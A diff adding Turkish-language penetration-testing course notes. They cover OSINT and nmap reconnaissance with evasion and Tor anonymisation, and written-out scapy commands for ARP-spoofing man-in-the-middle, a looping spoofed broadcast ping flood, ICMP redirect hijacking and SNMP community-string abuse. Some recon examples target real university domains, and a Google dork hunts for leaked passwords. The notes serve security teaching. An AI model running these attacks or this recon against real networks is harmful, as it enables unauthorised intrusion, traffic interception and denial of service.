@@ -1,0 +1,384 @@
+---Recon (Bilgi Toplama)
+
+---Pasif Bilgi Toplama (OSINT) (Açık Kaynak İstihbaratı): 
+-Senaryo: Black Box pen.test isteniyor:
+-Yapacağımız ilk iş: verilen adresin IP'sini öğrenme yöntemleri 
+=> ping ankara.edu.tr
+=> nslookup
+server 8.8.8.8
+www.ankara.edu.tr
+
+ICANN = bütün dünyadaki ip adreslerinin dağıtılması hakkında arama yapılabilir. 
+RIPE = avrupadaki ip adreslerini aratabileceğimiz yer.
+-www.ankara.edu.tr için elde ettiğimiz ip adresini ripe içerisinde aratıyoruz. elde ettiğimiz net-name'yi tekrar ripe'de aratarak başka bilgilere de ulaşabiliriz.
+
+=> who.is ankara.edu.tr (tr uzantılarda çalışmıyor?)
+=> ipinfo.io (arama servisi)
+=> fierce -dns ankara.edu.tr
+
+-Saldırmadan önce bulabildiğimiz her şeyi toplamaya çalışacağız.
+
+-Subdomain tespiti: google üzerinden => site:*.ankara.edu.tr şeklinde arama yaparsak subdomainlere ulaşabiliriz.
+
+-Hedefe ait virtualhost'ların tespiti: => bing.com arama motorundan ip:x.y.z.a şeklinde arama yaptığımızda virtualhost'lara ulaşabiliriz.
+
+-Hedefe ait e-mailler: => theharvester -d ankara.edu.tr -b bing
+
+-Cloudflare: websitelerine ip değiştirme, bilgileri gizleme, ddos savunmaları gibi hizmetler veriyor. www.osman.com bu adresi cloudflare koruyor. ama subdomainler açıkta kalır.
+
+-Hedefe ait indirilebilir dosyalar: => google => filetype:pdf ankara.edu.tr
+*-2.yöntem = FOCA
+-3.yöntem(stabil değil) = metagoofil
+
+-Lokasyon tespiti: ipinfo.io, ip2location.com, whois.domaintools.com (IP adresini aratarak)
+
+-Reverse whois: IP veriyoruz. bu IP'ye ait bilgilere ulaşıyoruz. siteler: whois.com (sansürlü, güncel), viewdns.info (sansürsüz, eski)
+
+-Netcraft: www.netcraft.com hedefin kullandığı işletim sistemini öğrenebiliriz. Örnek: eğer eski bir apache serveri kullanılıyorsa versiyonuna ait bazı zafiyetlere sahip olabilir. Bu zafiyetler kullanılabilir. Veya => http://whois.domaintools.com/ sitesinden de öğrenilebilir.
+
+-Shodan: www.shodan.io => bilgi toplamak için gelişmiş bir arama motoru. parametreler: hostname:ankara.edu.tr, country:tr alternatif siteler: zoomeye, censys.io(lokasyon + port bilgisi de var)
+
+-FOCA: hedefe ait indirilebilir bütün veya bazı dosyaları düzenli bir şekilde indirip analiz edebilmemizi sağlayan tool. Metadata analizleri sayesinde bir çok bilgi elde edilebilir. 
+
+-Robtex: www.robtex.com => istenen sitenin network'ünü şema halinde gösteren servis.
+
+-Google üzerinden keşif işlemleri: google filtreleri hakkında detaylı bilgiler=> https://www.exploit-db.com/google-hacking-database/ örnek: site:*.ankara.edu.tr
+
+-Hedefe ait giriş panellerinin tespiti: google filtreleriyle bulunabilir. inurl:login site:*.ankara.edu.tr
+
+-Dump: kötü niyetli kişiler tarafından bir database'in patlatılarak bilgilerin internette herkese açık olarak yayınlanması.
+
+-Hedef domaine benzer domainlerin tespiti: kullanıcı yazım hatası yapıp fark etmeyerek, hedef domaine benzer bizim aldığımız domain'e girebilir. kali tool
+=> urlcrazy -r ankara.edu.tr
+
+-Alexa analizi: => www.alexa.com : domain'ler hakkında istatiksel bilgiler tutan bir servis.
+
+-İş ilanları analizi: bazen araştırılan hedef, kendisi hakkında donanım/yazılım bilgilerini iş ilanlarında paylaşmış olabilir.
+
+-Archive.org analizi: => archive.org : internet sitelerinin eski belgelerinin yer alıyor olabileceği bir servis. bağımsız ve kar amacı gütmüyor.
+
+-Sosyal medya hesaplarının analizi: face'de paylaştığı fotoğraf örnek: bilgisayarın ekran görüntüsü atmış olabilir. kritik bir bilgi elde edebiliriz. (veriden veri üretme) (fotoğraftan parmak izi çıkartan adam örneği)
+
+-Kaynak kod ve geliştirici firma analizi: bir websitesinin kaynak kodları incelenerek bilgi elde edilebilir.
+
+-Çalışanların geliştirici siteleri analizi: hedef kurumdaki çalışanların github hesaplarından bilgi elde edilebilir.
+
+*-Pastebin üzerinden bilgi toplama: => www.pastebin.com : Dump'ların vs. paylaşıldığı bir site. örnek: google => site:pastebin.com intext:"password"
+
+-Finans araştırması: Hedefe göre değişir. 
+
+---Aktif Bilgi Toplama
+
+-NMAP: hangi zafiyetlere sahip vs. gibi analizler yapan tool. Sürekli istek yapmak bir anomalidir. Karşı taraf bunu fark edip bizi engelleyebilir.
+
+=> ifconfig eth0 (kendi IP'mizi öğreniyoruz)
+
++Ağda bulunan ayakta bulunan bütün cihazların IP'lerini nasıl öğreniriz?
+-=>netdiscover -i eth0 -r 10.0.2.0/24
+-=>nmap -sP 10.0.2.0/24 -vv veya nmap -sP 10.0.2.0-150 -vv
+
+Örnekler:
+-En sık kullanılan 500 port
+=> nmap 10.0.2.7 --top-ports 500
+=> nmap -sV 10.0.2.7 
+
+=> nmap -sS -sV 10.0.2.7 -vv (syn paketi gönderir) synack döndüren portları listeler. (her portu açık gösterirse) 
+=> nmap -sT -sV 10.0.2.7 -vv (açık olan portların versiyon taramasını yapar)
+=> nmap -sT -sV -p80,8000-8100 10.0.2.7 -vv (spesifik olarak bir port veya port aralığını taramak)
+=> nmap -sT -sV -p- 10.0.2.7 -vv (tüm portları tarar)
+=> nmap -sT -sV 10.0.2.7 -O -vv (tüm portları tarar) (işletim sistemi tarar. en az bir açık bir de kapalı porta ihtiyacı var)
+=> nmap -sT -sV 10.0.2.7 -O -vv -T4 -A (belirli süre kalıplarıyla arama yapar, A daha agresifleştirir)
+=> nmap -f -f -sT -sV 10.0.2.7 -O -vv -T4 -A  (firewall varsa nasıl aşarız? paketi parçalara bölerek)
+=> nmap --spoof-mac=IBM (atlatma yollarından biri, kendimizi IBM olarak gösteriyoruz)
+=> nmap -D 192.168.1.1,192.168.1.2,10.0.2.7,192.168.1.3 (paketleri 4'e böldük ve 4 tane IP'den gönderilmiş olarak gösterip araya kendimizi de sıkıştırdık. sızma yöntemi)
+
+-Scriptler(NSE):
+
+=> ls /usr/share/nmap/scripts/ (scriptleri listeler)
+
+=> nmap -sT -sV -p 25 --script=ftp-vsftpd-backdoor.nse 10.0.2.7 (çalışmadı)
+
+-Direk ack paketi yollayıp cevap alırsak firewall yok demektir.
+
+@sC = script kullanımını sağlayan parametre
+@f = gönderdiğimiz paketleri parçalar ve gönderildiği yerde birleşirler bu sayede güvenlik sistemi atlatılabilir.
+@top-ports value = en sık kullanılan portları tarar
+@system-dns = işletim sisteminin DNS servisini kullanır.
+@sS = syn paketi yollar
+@sA = ack paketi yollar
+@sT = bağlanma komutu
+@sV = port durumunu öğren
+@v = verbose (gereksiz detayları gösterme)
+@vv = more verbose
+@T<0-5> = zaman şablonlarıyla tarama yapar. değer yükseldikçe daha hızlı tarar ama yavaş tarama daha sağlıklı sonuç verir.
+@A = Enable OS detection, version detection, script scanning, and traceroute (daha derin tarama)
+
+-TOR: bizi mass networke sokar ve ip adresimizi bu nested network'deki başka birinin ip adresini alarak çıkarıp ulaşmak istediğimiz yere ulaştırır. bunun riski bir başkası da bizim ip'mizi alarak başkasına saldırabilir ve saldıran olarak bizim IP'miz görünür.
+
+-Örnek kendini gizleme: saldırgan=>vpn=>vpn=>TOR=>vpn=>Kurban (hız pert, gizlilik OP)
+
+=> cat /etc/proxychains.conf 
+
+# tor
+# proxychains
+# nmap
+
+=> proxychains nmap 10.0.2.7 (tor'dan bir IP alarak nmap ile scan yapar)
+=> tor (tor servisini başlatır)
+=> firefox(advanced settings => network => settings => manuel proxy => socksv_4 host: 127.0.0.1 port:9050)
+=> proxychains firefox (firefox'u tor'da açar) (bunu yaptıktan sonra IP'ni kontrol et)
+
+-unicornscan:
+
+=> syntax = unicornscan IP:port
+=> unicornscan 10.0.2.7:25 (25.portu tara)
+
+-nmap bize rapor üretebiliyor. 
+
+=> nmap 10.0.2.4 -oA xp
+
+-çalışmalar: üni. hakkında bilgi toplama
+
+---DNS üzerinden bilgi toplama:
+-DNS eğer bilmeyip bilgiyi başka dns sunucularından getirmeye çalışıyorsa buna recursive denir. DNS sunucusuna recursive olmayan sorgular gönderdiğimizde DNS sunucusunun cache'inde bu bilgi varsa geri döner, yoksa cevap gelmez. Bu sayede o DNS sunucusunda istediğimiz bilginin daha önce istenip istenmediğini öğrenebiliriz. Yani birisi bulmak istediğimiz siteye daha önce girmiş mi sorusunun cevabını alabiliriz.
+
+-cache bilgileri sonsuza kadar saklamaz. belli bir süre sonra DNS sunucusu bilgileri kendisi tekrar almak için gider. bunun bilgisine de şuradan ulaşılabilir:
+
+=> dig www.ibu.edu.tr 
+= www.ibu.edu.tr.	///saniye (6673)	IN	A	194.27.225.124
+
+-scapy ile çalışırken DNS(rd=1) değerini rd=0 ile değiştirirsek paket non-recursive olur.
+-dig için recurse parametresi ile bu ayar yapılabilir.
+
+-DNS üzerinden toplanabilecek bilgiler:
+SOA kaydına bakılarak e-mail adresi alınabilir.
+Zone Transfer yapılabilir.
+Brute Force yapılabilir.
+
+-SOA kaydı sorgulama:
+=> nslookup -type=SOA ibu.edu.tr || dig SOA ibu.edu.tr
+
+-DNS sunucusunu öğrenme:
+=> nslookup -type=NS ibu.edu.tr || dig NS ibu.edu.tr
+
+-Eğer istediğimiz bir DNS'ten sorgulatmak istiyorsak bunu da ayrıyetten belirtmemiz gerekiyor => server 8.8.8.8
+
+-fierce default wordlist => /usr/share/fierce/hosts.txt
+
+///scapy ödevi
+
+-Hazır Örnek: 
+answer=sr1(IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.thepacketgeek.com")),verbose=0)
+
+-Deneme:
+subdegisken=["obs", "demo", "login"]
+for i in subdegisken:
+	send(IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www."+subdegisken[i]+"trakya.edu.tr"))
+
+
+
+-Çözüm:
+=> python
+=> from scapy.all import *
+=> for i in open(*/tmp/sozluk.txt"):
+=> 	answer=sr1(IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=i.rstrip('\n')+".ibu.edu.tr")),verbose=0)
+	answer[DNS].an
+	-enter-
+	-enter-
+
+---Zone Transfer:
+-ilk etapta yapmamız gereken şey hedefle ilgili sorumlu dns sunucularını bulmak
+
+-bu yöntem maksimum kapsamı tespit edebilmek için kullanılır.
+
+=> dig ns ibu.edu.tr
+=> dig axfr ns2.ibu.edu.tr @ibu.edu.tr (başarılı olana kadar bütün dns sunucularını dene)
+
+-çalışan örnek
+
+=> dig zonetransfer.me NS
+=> dig axfr nsztm2.digi.ninja @zonetransfer.me (dns2)
+=> dig axfr nsztm1.digi.ninja @zonetransfer.me (dns1)
+
+---Mail üzerinden bilgi toplama:
+
+-Mail header arasından bilgi toplanabilir. Bir e-mail grubuna e-mail yollandığında eğer o gruptan mail'i alamayacak bir kişi varsa, e-mail servisi bize bu kişinin yolladığımız e-maili alamayacağının bilgisini verirken kişiyi ifşa etmiş oluruz. 
+
+-Kaynak header'e ulaşmak => gmail'e gir. mail'i aç. sağ üstteki reply'ın yanındaki oka bas. Show original'i seç.
+
+-Kaynak header'in analizi için => http://mxtoolbox.com/EmailHeaders.aspx
+
+-Örnek:
+=> dig ns barkin.info (dns sunucusunu öğreniyoruz)
+=> dig ns barkin.info @ns1.cloudns.net (e-posta'yı öğreniyoruz)
+=> nc eposta.kilic.xyz 25 -v
+
+-ehlo localhost (valar morghulis)
+
+---21:15
+
+---nmap'in 2 özelliği daha var:
+
+-1 tarama yapma esnasında tarayan kişi kendisini gizleyebilmek için kullanılabilecek yöntemler:
+
+---1a: Decoy Scan: sahte IP'lerden paket üreterek kalabalık yaratıyorsunuz. kalabalığın arasına 1 ya da 2 kendi IP'mizi ekleyince bizim yolladığımız paketler göze batmayacak şekilde kalıyor. 
+
+---1b: IDLE Scan: gerekenler: saldırgan, hedef, kurban(zombi). uygulayabilmek için 2 şart var. bir: bulacağınız kurbanın network trafiğinin az olması lazım. güzel kurbanlar: boşta olan makineleler. iki:  
+
+-hikaye: kurbana paket gönderilir. kurban geri cevap verir. kurbana bu sefer hedeften gidiyormuş gibi bir paket daha gönderilir. kurban geri cevabını hedefe döner. hedefte kurbana eğer port kapalı veya arada firewall varsa reset+ack döner. bu sefer kendimizden kurbana paket yollarız (x+1). bize cevabı döner. Bu sayede hedef portun kapalı olup olmadığını veya arada firewall olup olmadığını öğrenebilme imkanımız olabilir. Bize dönen cevap x+1 ise port kapalı/firewall, x+2 ise port açık demektir.
+
+---Routing: networkler arası bağlantının sağlanabilmesi için gönderilecek paketlerin  gönderilmesi işi için aracılık yapılması.
+
+-Şema: A -|- B => | = router
+
+-Üç makine (ortadaki router olarak çalışan linux) uygulaması.
+
+=> arp -a (arp tablosunu görüntülemek için)
+=> route (routing tablosu)
+=> route add -net 10.0.1.0/24 gw 10.0.2.1 (subnet'inde olmayan bir yere gitmeye çalışan makineye nasıl gideceğini söylememiz gerekiyor. bu komut ile söylüyoruz.)
+=> echo 1 > /proc/sys/net/ipv4/ip_forward (aynı işlem karşı taraf için de yapılmamışsa işlem yapılan taraf paketi yollayabilir ama route işlemi yapılmamış taraf cevap gönderemez. route tablosu eklendikten sonra yönlendiriciyi de açmamız gerekir.)
+=> route add -net 10.0.2.0/24 gw 10.0.1.1 (yönlendiriciye de nasıl gideceğini route add ile göstermemiz gerekiyor.)
+
+---NAT:
+
+=> iptables -t nat -L -vn (tabloyu gösterir)
+=> iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 
+
+-Firewall: firewall dediğimiz şey sadece hangi paketin hangi portlara gidip gidemeyeceğine karar verir. yerine gidemeyen paketler düşer. sistemde olmaması gereken bir bozukluk tespit edilerek atlatılır. 
+
+---Gateway:
+
+-Hiçbir şeyi bilmediğiniz, geri kalan her şey için yönlendirilmenizin yapıldığı yer. Örnek: fransızca bilmiyorsun. fransızca bilen tercüman kullanıyorsun. o tercüman işte gateway.
+
+--------------
+
+---DNS: ip'yi domain'e, domain'i ip'ye çeviren servistir. 
+
+-reverse who.is => IP ile sorgulattığımızda sınır içerisinde başka hedefler de elde etme ihtimalimiz vardır. o yüzden dns sorgusu yaptığında, reverse dns de yap.
+
+
+
+------------
+
+---Cloudflare By pass: Site DNS sunucularını cloudflare'a teslim edip onun süzgeçten geçirdiği trafiği alıyor. 
+
+-amap. internetin tamamını tarar. 
+
+-------------
+
+---ARP: her makinenin arp tablosu vardır. ip adresi broadcast yapılır. kime aitse onun MAC adresi öğrenilir. 2.katmanda çalışır. makinelerin aynı subnet'de olması gerek.
+
++Crosscable ile bağlı ama farklı subnet'deki iki makine birbirleriyle nasıl iletişim kurar?
+-ARP ile. Aynı subnet'de olmayan makineler ARP ile iletişim kuramaz ancak gidilmek istenen IP'ye nasıl gidileceğini route add ile gösterirsek ağa ulaşacaktır.
+
+-ARP'ın herhangi bir doğrulama kabiliyeti yoktur. Yerel ağdaki makineleri keşfetmek için ARP protokolü kullanılabilir.
+
++Neden ICMP değil de ARP ile bilgi topluyoruz?
+-Eğer ping engellenmişse ICMP ile hedef açık olsa bile kapalı gibi görürüz. ARP'ta böyle bir şey söz konusu değildir.
+
+-Örnek ARP keşfi: 
+=> iptables -t filter -L -vn
+=> nc 192.168.0.2 22 -v
+=> arping 192.168.0.2 
+=> (ağı izleme) tcpdump -i eth0 -nnv arp
+=> arp-scan -l -I eth0 (yerel ağdaki bütün makineleri tarayarak sonuç alma işlemi yapar)
+
+-Ödev: scapy ile arp taraması yap.
+
+---scapy ile arp taraması ödevi
+
+---Network Saldırıları
+
+-ARP kullanılarak yapılabilecek saldırı:
+
+-Haberleşmek isteyen sistemlerin ya haberleşmemesini sağlamak ya da haberleşmeleriyle ilgili olan kısma kendisini de dahil etmektir. Maksat zarar vermek ise, servis dışı etmek için kullanılabilir. Maksat fayda sağlamak ise hedefin trafiğinin kendi üzerimizden geçmesini sağlamaktır. Trafiği kendi üzerimizden geçirdiğimiz saldırı türü Man in the Middle olarak adlandırılır.
+
+-Server, Client, Attacker. Attacker, server ile client arasında arp ile bağlantı kurar. Attacker, server'in ip adresine kendi mac adresini ekleyerek client'e arp paketi yollar. Client'in arp tablosundaki ip-mac değerleri yoksa yazılır, varsa saldırganın yolladığı şekilde güncellenir. Bir sonraki isteği client, saldırgana yollayacaktır. Eğer saldırgan aynı işlemi server için de yaparsa (kendi ip'sini client olarak gösterip mac adresine kendi mac adresini vermek) man in the middle saldırısı olacak ve trafik saldırganın üzerinden geçecek. Eğer saldırgan server için bu işlemi yapmazsa client cevap alamayacak ve servis dışı kalacak(Dos). 
+
+-Örnek:
+
+-Server IP: 192.168.0.23, MAC:f3:9f
+-Client IP: 192.168.31.31 MAC: 97:48
+-Attacker IP: 192.168.0.105 MAC: 0b:61
+
+=> scapy
+- sendp(Ether(dst="00:0c:29:6b:97:48")/ARP(op=2,psrc="192.168.0.23",pdst="192.168.31.31",hwsrc="00:0c:29:f0:0b:61",hwdst="00:0c:29:49:97:48")) 
+- sendp(Ether(dst="00:0c:29:6b:f3:9f")/ARP(op=2,psrc="192.168.31.31",pdst="192.168.0.23",hwsrc="00:0c:29:f0:0b:61",hwdst="00:0c:29:49:f3:9f"))
+- NOT: op=2 normalde çalışması gerekiyordu, çalışmadı. 1 yaptığımızda çalıştı. 
+
+- Moladan sonra Ether ekleyince op=2 çalıştı. (Linux'da çalışıyor, windows'ta çalışmıyor. op=1 ikisindede çalışıyor)
+- echo 1 > /proc/sys/net/ipv4/ip_forward/ (router = 1 yapma işlemi)
+
+-Tool kullanarak:
+=> arpspoof -i eth0 -c both
+
+---Layer 3:
+
++TCP/UDP'de yapacağımız IP sahteciliği (IP Spoofing) başarılı olabilir mi?
+-TCP içerisinde çok zor. Eğer seq/ack sayılarına sahipsek yapabiliriz. UDP içerisinde ise herhangi bir doğrulama sistemi olmadığı için basitçe yapılabilir.
+
+-Olmayan bir IP spoof edilerek karşıya kör(blind) bir şekilde, cevapları almadan sürekli paket yollanılarak yapılır. Eğer spoof ettiğimiz IP gerçekten kullanılıyor ise, RST döner.
+
+---Layer 4:
+
+-TCP'ye yapılabilecek bir saldırı(SYN Flood?): Sahte bir IP ile sürekli SYN paketi yollanır. Yollanan paketleri hedef SYN tablosunda tutar. Hedefin döndürdüğü SNY+ACK paketi boşa gideceği için cevap gelmez ve tablonun boyutu artar (Dos). Alınabilecek önlemler: 
+1- Tablonun boyutunu arttırmak (Maliyet + çözüm değil). 
+2- Syn proxy: (Syn proxy'i bütün portlara syn yollayarak tespit edebiliriz. Eğer kapalı port yoksa syn proxy ile karşı karşıya olduğumuzu anlarız.) Hedef ile aramızda durarak SYN paketlerini kendi üzerine alır SYN+ACK gönderir. ACK geri geldiğinde paketi hedefe ulaştırır. 
+
+3- Syn proxy cookie: Threeway Handshake esnasında değişmeyen 4 bilgi var. Bunlar: Source IP, Source Port, Destination IP, Destination Port. Makine bir fonksiyon ile bu 4 bilgiyi ve bir de makine çalıştırılmaya başladığında RAM de random oluşan bir değeri topluyor. Ardından bu "toplam"ı SYN isteği yollayan makinelere SYN+ACK döndüreceği zaman sequence number olarak kullanıyor. Kendisine threeway handshake'in son aşaması olan ACK paketi döndüğünde ACK sayısı "toplam"+1 olmak zorunda. "toplam"+1 den 1 çıkarıp gelen ACK paketini doğruluyor.
+
+---Ödev: Scapy ile SYN Flood yapmak. 
+
+-UDP/ICMP kullanılarak yapılabilecek bir saldırı: İç ağdayken ağdaki herkese kaynak IP hedefin IP'si olarak gösterilip ping yollanır. Herkes birden hedefe ping reply döner. 
+
+=> echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts (broadcast yapabilmemiz için bu dosyanın değerinin 0 olması gerek, yoksa icmp paketlerini broadcast olarak yollayamayız.)
+
+-Örnek: 
+=> scapy
+send(IP(src="hedef",dst="broadcast")/ICMP(type=8),loop=1)
+
+-DNS'e de aynı mantık ile saldırırsak: DNS Amplification
+
+-ICMP Redirect(type=5): ICMP Redirect mesajı, kendisine ulaşmak isteyen makineye bir router(yönlendirici) tarafından eğer bağlanabileceği daha iyi bir router varsa, bunun bilgisini döndürür.
+
+-ICMP Redirect ile Man in the Middle Attack (ICMP type=5): Hedefe daha iyi bir router olduğunu, bu router'in biz olduğumuzu söylediğimiz saldırı. Bu sayede hedef bizi router olarak kullanmaya çalışacak, hedefin trafiğini üzerimize alacağız. 
+
+-Uygulama: 172.16.193.156 (hedef), 172.16.193.151(attacker)
+
+- ip/icmp/ip/tcp
+
+=> scapy
+- send(IP(src="192.168.0.1",dst="192.168.0.9")/ICMP(type=5,code=1,gw="192.168.0.10")/IP(src="192.168.0.9",dst="46.45.154.70")/TCP(flags="S",dport=80,sport=5555))
+
+-Ödev: icmp redirect ile man in the middle
+
+---SNMP (Simple Network Management Protocol): 
+
+-SNMP, UDP Protokolü ile çalışır. 161 portunu kullanır.
+
+-MIB/OID : Ağın dallara ayrılarak hangi dalın kaçıncı MIB'i şeklinde bir sorguya dönen bilgiler OID diye geçer. Bu bilgilerle MIB içerisinde konumunu bildiğimiz bir makinenin OID bilgilerine ulaşabiliriz.
+
+-MIB sayılarla ifade edilir. Alt dallara geçmek için araya nokta konur. Örnek: .1.3.6
+
+-Community String: SNMP paketi içerisinde yer alan bir bilgidir. SNMP paketi içerisinde yer alan community string'ler: Public(read only), private(write). Community string ele geçirilerek bu yetkiler elde edilebilir.
+
+-Üç versiyon vardır. V1 ve V2 Community String üzerinden gider. V3 ise username-password'da kullanır.
+
+=> snmpwalk -v 1 -c public 192.168.0.39 .1.3.6.1.2.1.2.2
+
+-İnternette "linux system oid's" şeklinde arama yapılarak OID örneklerine ulaşılabilir.
+
+---Ödev: 192.168.0.39'dan SNMP ile bilgi topla:
+
+=> snmpwalk -v 1 -c public 192.168.0.39 .1.3.6.1.2.1.2.2
+
+-Scapy ile:
+
+=> scapy
+-p=IP(dst="192.168.0.39")/UDP(sport=161,dport=161)/SNMP(community="public",PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.55.192.168.2.100"),value="192.168.0.39.config")]))
+-send(p)
+-Trafiği izlemek için wireshark filtresi : snmp
+
+*NOT*: scapy yöntemi tam çalışmıyor, bazı parametreler eksik. internetten araştır. 
+
+-NMAP ile: => nmap -p161 -T5 -sU --script=snmp-*.nse 192.168.0.39 -vv
